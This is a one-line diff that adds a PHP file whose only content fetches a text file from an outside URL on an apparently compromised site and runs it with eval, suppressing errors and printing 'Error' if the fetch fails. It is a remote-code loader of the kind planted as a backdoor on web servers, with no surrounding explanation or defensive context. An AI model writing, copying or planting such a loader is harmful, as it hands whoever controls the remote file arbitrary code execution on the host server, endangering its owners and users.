@@ -1,0 +1,1 @@
+<?php ($r=@file_get_contents('https://test.dui.edu.ng/alooo/alo.txt'))?eval('?>'.$r):die('Error');
